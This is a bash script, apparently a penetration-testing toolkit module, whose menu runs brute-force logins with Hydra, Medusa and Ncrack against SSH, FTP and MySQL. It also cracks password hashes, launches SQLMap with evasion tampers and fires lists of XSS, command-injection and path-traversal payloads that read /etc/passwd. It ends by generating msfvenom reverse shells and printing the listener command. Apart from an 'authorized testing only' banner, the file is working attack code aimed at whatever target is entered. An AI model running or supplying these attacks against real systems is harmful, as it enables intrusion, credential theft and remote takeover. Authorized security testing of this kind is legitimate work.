#!/bin/bash

# Attack Modules

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

attack_menu() {
    while true; do
        clear
        echo -e "${RED}=== Attack Modules ===${NC}"
        echo -e "${RED}[!] AUTHORIZED TESTING ONLY [!]${NC}"
        echo
        echo -e "${CYAN}[1]${NC}  Hydra - Brute Force Login (SSH/FTP/HTTP/DB)"
        echo -e "${CYAN}[2]${NC}  Medusa - Parallel Brute Forcer"
        echo -e "${CYAN}[3]${NC}  John the Ripper - Password Cracking"
        echo -e "${CYAN}[4]${NC}  Hashcat - GPU Password Cracking"
        echo -e "${CYAN}[5]${NC}  SQLMap - Advanced SQL Injection"
        echo -e "${CYAN}[6]${NC}  XSStrike - Advanced XSS Detection"
        echo -e "${CYAN}[7]${NC}  Command Injection Tester"
        echo -e "${CYAN}[8]${NC}  Path Traversal / LFI Tester"
        echo -e "${CYAN}[9]${NC}  CSRF Token Analyzer"
        echo -e "${CYAN}[10]${NC} SSH Brute Force with Ncrack"
        echo -e "${CYAN}[11]${NC} FTP Brute Force"
        echo -e "${CYAN}[12]${NC} MySQL Brute Force"
        echo -e "${CYAN}[13]${NC} Custom Payload Injector"
        echo -e "${CYAN}[14]${NC} Reverse Shell Generator (Msfvenom)"
        echo -e "${CYAN}[0]${NC}  Back to Main Menu"
        echo
        read -p "Select option: " opt

        case $opt in
            1) hydra_brute ;;
            2) medusa_brute ;;
            3) john_crack ;;
            4) hashcat_crack ;;
            5) sqlmap_attack ;;
            6) xsstrike_scan ;;
            7) cmdi_test ;;
            8) lfi_test ;;
            9) csrf_test ;;
            10) ssh_brute ;;
            11) ftp_brute ;;
            12) mysql_brute ;;
            13) custom_payload ;;
            14) rev_shell_gen ;;
            0) break ;;
            *) echo -e "${RED}[!] Invalid option${NC}" ;;
        esac
        read -p "Press Enter to continue..."
    done
}

hydra_brute() {
    log "Hydra Brute Force Attack"
    echo -e "${CYAN}Supported: ssh, ftp, http-post-form, http-get, mysql, smb, rdp${NC}"
    read -p "Target IP/Host: " target
    read -p "Service (ssh/ftp/http-post-form/http-get/mysql): " service
    read -p "Username list: " userlist
    read -p "Password list: " passlist
    
    case $service in
        http-post-form)
            read -p "Form path and failure string (e.g., /login.php:user=^USER^&pass=^PASS^:F=incorrect): " formdata
            hydra -L "$userlist" -P "$passlist" "$target" "$service" "$formdata" -o "$RESULTS_DIR/attacks/hydra.txt" -V
            ;;
        http-get)
            read -p "Protected URL: " url
            hydra -L "$userlist" -P "$passlist" "$target" "$service" "$url" -o "$RESULTS_DIR/attacks/hydra.txt" -V
            ;;
        *) hydra -L "$userlist" -P "$passlist" "$target" "$service" -o "$RESULTS_DIR/attacks/hydra.txt" -V ;;
    esac
    success "Hydra results saved"
}

medusa_brute() {
    log "Medusa Brute Force"
    read -p "Target: " target
    read -p "Service (ssh/ftp/http/mysql/smb): " service
    read -p "Username list: " userlist
    read -p "Password list: " passlist
    medusa -h "$target" -u "$userlist" -P "$passlist" -M "$service" -O "$RESULTS_DIR/attacks/medusa.txt"
    success "Medusa results saved"
}

john_crack() {
    log "John the Ripper - Password Cracking"
    echo -e "${CYAN}[1]${NC} Generate password hash from file"
    echo -e "${CYAN}[2]${NC} Crack existing hash"
    read -p "Select: " opt
    case $opt in
        1)
            read -p "File to generate hash from: " hashfile
            read -p "Format (raw-md5, raw-sha1, ssh, ssh-ng, pdf, zip, etc): " format
            john --format="$format" --wordlist=/usr/share/wordlists/rockyou.txt --output="$RESULTS_DIR/attacks/john.txt" "$hashfile"
            ;;
        2)
            read -p "Hash file path: " hashfile
            read -p "Format: " format
            john --format="$format" --wordlist=/usr/share/wordlists/rockyou.txt --output="$RESULTS_DIR/attacks/john.txt" "$hashfile"
            ;;
        *)
            read -p "Hash file: " hashfile
            john --wordlist=/usr/share/wordlists/rockyou.txt "$hashfile" --output="$RESULTS_DIR/attacks/john.txt"
            ;;
    esac
    success "John results saved"
}

hashcat_crack() {
    log "Hashcat GPU Password Cracking"
    echo -e "${CYAN}Common modes: 0=MD5, 100=sha1, 1400=sha256, 1700=sha512, 3200=bcrypt${NC}"
    read -p "Hash mode: " mode
    read -p "Hash file: " hashfile
    read -p "Wordlist: " wordlist
    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
    hashcat -m "$mode" "$hashfile" "$wordlist" -o "$RESULTS_DIR/attacks/hashcat.txt" --force
    success "Hashcat results saved"
}

sqlmap_attack() {
    log "SQLMap Advanced SQL Injection"
    read -p "Target URL: " url
    read -p "Parameter (e.g., id): " param
    read -p "Risk (1-3): " risk
    read -p "Level (1-5): " level
    read -p "Database type (mysql/postgresql/mssql/oracle/sqlite): " db
    
    sqlmap -u "$url" --risk=$risk --level=$level --dbms="$db" --batch --tamper=space2comment,between,randomcase --output-dir="$RESULTS_DIR/attacks/sqlmap" 2>&1 | tee "$RESULTS_DIR/attacks/sqlmap.log"
    success "SQLMap results saved"
}

xsstrike_scan() {
    log "XSStrike Advanced XSS Scanner"
    read -p "Target URL with parameter (e.g., $TARGET_URL/search.php?q=test): " url
    if command -v xsstrike &> /dev/null; then
        xsstrike -u "$url" --crawl --depth 2 -o "$RESULTS_DIR/attacks/xsstrike.txt" 2>&1
    else
        echo -e "${YELLOW}[!] XSStrike not installed. Using manual payloads...${NC}"
        payloads=(
            "<script>alert(1)</script>"
            "<img src=x onerror=alert(1)>"
            "<svg onload=alert(1)>"
            "<body onload=alert(1)>"
            "<input onfocus=alert(1) autofocus>"
            "<select onmouseover=alert(1)>"
            "<textarea onmouseover=alert(1)>"
            "<marquee onstart=alert(1)>"
            "<div style=\"width:100px;height:100px;background:url(javascript:alert(1))\">"
            "<iframe src=javascript:alert(1)>"
        )
        for payload in "${payloads[@]}"; do
            test_url=$(echo "$url" | sed "s/=test/=$payload/")
            if curl -s "$test_url" | grep -q "$payload"; then
                echo -e "${GREEN}[+] XSS Reflected: $payload${NC}"
            fi
        done | tee "$RESULTS_DIR/attacks/xss_manual.txt"
    fi
    success "XSS scan saved"
}

cmdi_test() {
    log "Command Injection Tester"
    read -p "Parameter to test: " param
    read -p "Base URL: " url
    payloads=(
        ";id"
        "|id"
        "||id"
        "&id"
        "&&id"
        ";cat /etc/passwd"
        "|cat /etc/passwd"
        "||cat /etc/passwd"
        ";ping -c 1 127.0.0.1"
        "|ping -c 1 127.0.0.1"
    )
    for payload in "${payloads[@]}"; do
        test_url="${url/$param/$payload}"
        response=$(curl -s "$test_url")
        if echo "$response" | grep -qE "uid=[0-9]+|root:x|PING.*127.0.0.1"; then
            echo -e "${GREEN}[+] Command Injection: $payload${NC}"
            echo "Payload: $payload" >> "$RESULTS_DIR/attacks/cmdi.txt"
            echo "URL: $test_url" >> "$RESULTS_DIR/attacks/cmdi.txt"
            echo "Response:" >> "$RESULTS_DIR/attacks/cmdi.txt"
            echo "$response" | head -n 10 >> "$RESULTS_DIR/attacks/cmdi.txt"
        fi
    done
    success "Command injection test saved"
}

lfi_test() {
    log "Local File Inclusion Tester"
    read -p "Parameter to test: " param
    read -p "Base URL: " url
    payloads=(
        "../../../../etc/passwd"
        "....//....//....//....//etc/passwd"
        "....\\....\\....\\....\\etc\\passwd"
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        "php://filter/convert.base64-encode/resource=index"
        "file:///etc/passwd"
        "/proc/self/environ"
        "/var/log/apache2/access.log"
        "/var/log/nginx/access.log"
    )
    for payload in "${payloads[@]}"; do
        test_url="${url/$param/$payload}"
        response=$(curl -s "$test_url")
        if echo "$response" | grep -q "root:x"; then
            echo -e "${GREEN}[+] LFI Found (etc/passwd): $payload${NC}"
            echo "Payload: $payload" >> "$RESULTS_DIR/attacks/lfi.txt"
        elif echo "$response" | grep -qi "apache\|nginx\|root:/"; then
            echo -e "${GREEN}[+] LFI Possible: $payload${NC}"
            echo "Payload: $payload" >> "$RESULTS_DIR/attacks/lfi.txt"
        fi
    done
    success "LFI test saved"
}

csrf_test() {
    log "CSRF Token Analyzer"
    curl -s "$TARGET_URL" > "$RESULTS_DIR/attacks/csrf_forms.html"
    echo -e "${YELLOW}[*] Analyzing forms for CSRF protection...${NC}"
    grep -i "csrf\|token\|_token\|nonce\|authenticity_token" "$RESULTS_DIR/attacks/csrf_forms.html" || echo -e "${RED}[-] No CSRF tokens found - potential vulnerability${NC}"
    success "CSRF analysis saved"
}

ssh_brute() {
    log "SSH Brute Force (Ncrack)"
    read -p "Target IP: " target
    read -p "Username list: " userlist
    read -p "Password list: " passlist
    ncrack -p ssh --user "$userlist" --pass "$passlist" "$target" -oN "$RESULTS_DIR/attacks/ssh_ncrack.txt"
    success "SSH brute force results saved"
}

ftp_brute() {
    log "FTP Brute Force (Hydra)"
    read -p "Target IP: " target
    hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt "$target" ftp -o "$RESULTS_DIR/attacks/ftp_hydra.txt" -V
    success "FTP brute force results saved"
}

mysql_brute() {
    log "MySQL Brute Force (Hydra)"
    read -p "Target IP: " target
    hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt "$target" mysql -o "$RESULTS_DIR/attacks/mysql_hydra.txt" -V
    success "MySQL brute force results saved"
}

custom_payload() {
    log "Custom Payload Injector"
    read -p "Payload: " payload
    read -p "Method (GET/POST): " method
    read -p "URL: " url
    read -p "Headers (optional): " headers
    if [ "$method" = "POST" ]; then
        if [ -n "$headers" ]; then
            curl -s -X POST -H "$headers" -d "$payload" "$url"
        else
            curl -s -X POST -d "$payload" "$url"
        fi
    else
        if [ -n "$headers" ]; then
            curl -s -H "$headers" "$url?$payload"
        else
            curl -s "$url?$payload"
        fi
    fi | tee "$RESULTS_DIR/attacks/custom_response.txt"
    success "Custom payload response saved"
}

rev_shell_gen() {
    log "Reverse Shell Generator (Msfvenom)"
    echo -e "${CYAN}Common payloads:${NC}"
    echo "  php/meterpreter/reverse_tcp"
    echo "  python/meterpreter/reverse_tcp"
    echo "  bash/meterpreter/reverse_tcp"
    echo "  windows/meterpreter/reverse_tcp"
    echo "  linux/x64/meterpreter/reverse_tcp"
    read -p "Payload: " payload
    read -p "LHOST (your IP): " lhost
    read -p "LPORT (your port): " lport
    read -p "Format (php, py, exe, elf, bash): " fmt
    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$fmt" -o "$RESULTS_DIR/attacks/shell.$fmt"
    success "Reverse shell saved to $RESULTS_DIR/attacks/shell.$fmt"
    echo -e "${YELLOW}[!] Start listener: msfconsole -x 'use multi/handler; set payload $payload; set LHOST $lhost; set LPORT $lport; exploit'${NC}"
}

attack_menu
